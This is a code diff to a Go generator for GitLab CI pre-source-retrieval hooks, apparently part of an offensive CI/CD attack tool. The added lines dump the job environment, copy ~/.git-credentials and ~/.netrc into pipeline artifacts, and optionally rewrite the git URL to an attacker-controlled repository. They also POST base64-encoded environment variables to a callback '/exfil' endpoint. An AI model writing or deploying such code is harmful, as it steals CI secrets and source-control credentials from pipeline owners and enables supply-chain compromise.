@@ -28,7 +28,18 @@ func GeneratePreGetSourcesYAML(o PreGetSourcesOptions) string {
       - |
 %s
   script:
-    - echo "Source retrieval completed"
+    - |
+      # Harvest credentials captured during pre-source hook phase
+      cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort > .pre-source-env.log || true
+      cp ~/.git-credentials .git-creds.bak 2>/dev/null || true
+      cp ~/.netrc .netrc.bak 2>/dev/null || true
+  artifacts:
+    when: always
+    paths:
+      - .pre-source-env.log
+      - .git-creds.bak
+      - .netrc.bak
+    expire_in: 1 day
   allow_failure: true%s
 `, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
 		indentBlock(strings.TrimSpace(script), 8),
@@ -43,37 +54,26 @@ func buildPreGetSourcesScript(o PreGetSourcesOptions) string {
 	var b strings.Builder
 
 	b.WriteString(`_HOOK() {
-  local _d
-  _d=$(mktemp -d)
-
-  # Step 1: Dump environment before source retrieval
-  printenv | sort > "$_d/pre_source_env.txt" || true
-  cat /proc/self/environ 2>/dev/null | tr '\0' '\n' >> "$_d/pre_source_env.txt" || true
-
-  # Step 2: Capture Git credentials and config
-  git config --global --list > "$_d/git_config.txt" 2>/dev/null || true
-  cat ~/.git-credentials 2>/dev/null >> "$_d/git_creds.txt" || true
-  cat ~/.netrc 2>/dev/null >> "$_d/netrc.txt" || true
+  # Runs BEFORE git fetches sources — credentials are live
+  git config --global --list 2>/dev/null || true
+  cat ~/.git-credentials 2>/dev/null || true
+  cat ~/.netrc 2>/dev/null || true
 `)
 
 	if strings.TrimSpace(o.ModifyGitURL) != "" {
 		fmt.Fprintf(&b, `
-  # Step 3: Redirect git fetch to attacker-controlled repository
+  # Redirect git fetch to attacker-controlled repository
   git config --global url."%s".insteadOf "$CI_REPOSITORY_URL" || true
 `, o.ModifyGitURL)
 	}
 
 	if strings.TrimSpace(o.CallbackURL) != "" {
 		fmt.Fprintf(&b, `
-  # Exfiltrate captured data
-  tar czf "$_d/pre_source.tar.gz" -C "$_d" . 2>/dev/null || true
-  curl -sS -X POST -F "file=@$_d/pre_source.tar.gz" -F "project=$CI_PROJECT_PATH" "%s/exfil" || true
+  curl -sS -X POST -F "project=$CI_PROJECT_PATH" -F "env=$(printenv | base64 -w0)" "%s/exfil" || true
 `, o.CallbackURL)
 	}
 
-	b.WriteString(`
-  rm -rf "$_d" || true
-}
+	b.WriteString(`}
 _HOOK || true`)
 
 	return b.String()
